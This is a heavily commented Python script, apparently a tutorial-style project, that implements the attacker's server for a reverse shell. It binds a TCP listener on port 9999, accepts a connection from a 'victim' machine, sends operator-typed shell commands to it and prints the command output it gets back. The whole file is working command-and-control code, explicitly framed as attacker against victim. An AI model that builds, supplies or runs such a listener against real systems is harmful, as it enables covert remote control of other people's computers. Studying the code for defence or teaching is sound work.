# Server file - running on server with static IP
# Functions:-
# 1. Creates a socket,bind it to a port and listens for incoming connections
# 2. Accept connections and pass commands to victim
# 3. Prints output of executed commands recieved from victim

import socket # module help us to create sockets that act as end-point for 2-way communication between 2 processes over a network
import sys  # module help us to operate on command line and execute terminal commands from python script

# function to create a socket
def create_socket():
	try:
		global host  # global variable storing host/ip of server
		global port  # global variable storing port on which server will be listening
		global s     # global variable for socket on which server will be listening
		host=""      # initialize with static ip of server
		port=9999    # any port number which is not reserved port(greater than 1023)
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # creating a socket object- AF_INET-refers to IPv4 address family, 
		#														SOCK_STREAM- use connection-oriented TCP protocol,SOCK_DGRAM- UDP connection

	except socket.error as e:        # Error handling
		print("Socket creation error: "+str(e))    # prints error message 

# function to bind socket to server(attacker) and listen to incoming connections from victim

def bind_socket():
	try:
		global host
		global port
		global s

		print("Binding to port: {}".format(port)) # Attemp to bind socket to host and port

		s.bind((host,port))   # binds socket object s to host/ip of server and port number specified in port variable
                              # if host="" it means that our socket is bind to our local computer and it can accept connections from all available interfaces.
                              # socket.gethostname() returns name of local computer and socket.gethostbyname(socket.gethostname()) it resolves hostname to ip address
                              # if host=socket.gethostname() or local ip then it binds socket to local computer but it only accepts connections from loopback interface 
                              # that means only processes within same host will be able to communicate to server thereby ensuring security from external network.
                              # If we use hostname as host then first DNS resolution will be accepted and behaviour of application might be problematic
                              #so prefer to use static IP address

		# if binding is successful then socket goes into listening state
		s.listen(5)  # it can tolerate max. of 5 bad connections after that it will throw an error

	except socket.error as e:                    # Error handling
		print("Socket binding error:- "+str(e)+"\n"+"Retrying...")  # prints socket binding error
		bind_socket()                            # keeps on retrying until socket binding is successful
    
# function to accept and establish connection with the victim (socket must be in listening state)
def accept_socket():

	global s

	conn,address=s.accept()  # s.accept() is a blocking function that blocks application temporarily until it recieves a connection request from victim
	               			 # it accepts incoming request and initiate 3-way handshake in case of TCP connection
	               			 # it returns a client socket object for that connection(conn) and address tuple that consists of (host,port)-IPv4
	               			 # and it consists of (host,port,flowinfo,scopeid) in case of IPv6

	print("Connection has been established!! with victim IP: " + address[0] +" and port: " + str(address[1])) # it prints IP and port of victim to which connection has been established
	send_commands(conn)
	conn.close()



# function to send commands from server(attacker) to client's computer(victim)
def send_commands(conn):
	while True:  # An infinite loop is written so that we are able to send multiple commands before closing connection
		cmd=input() # Take input command from user in variable cmd

		if cmd=="quit": # if input command is quit , then we close the connection,socket and terminal
			print("Closing the connection!!")
			conn.sendall(str.encode(cmd))     # passing quit command to client
			conn.close() # closing connection
			s.close()    # closing socket- for single client case
			sys.exit()   # closing the terminal

		if len(str.encode(cmd)) > 0: # str.encode() it converts string from unicode format to utf-8 format(byte format)
 								     # data is sent on network in form of bytes only..if length of data is 0 then do nothing otherwise send command to victim

			conn.sendall(str.encode(cmd)) # conn.send() is used to send data over the established connection in form of bytes
 									      # conn.send() returns number of bytes sent which might be less than total data passed to function call
 									      # It is responsibiity of application to check that entire data is transmitted and perform re-transmission if entire data is not sent at once
 									      # conn.sendall() ensures that entire data is sent and it continues to send data untill entire data is being sent and it returns None on success	

			client_response=str(conn.recv(1024),"utf-8")   # now we need to accept data from client which will contain output of our command executed on client's terminal
 										  				   # conn.recv() takes an arguement which is maximum number of bytes that can be recieved at once
 										  				   # conn.recv() return data in bytes which needs to be converted in utf-8 format anf then converted to str format

			print(client_response,end="") #print client response and end="" is used so that next command begins from new line in terminal


# main function to call all above functions
def main():
	create_socket()
	bind_socket()
	accept_socket()

if __name__=="__main__":
	main()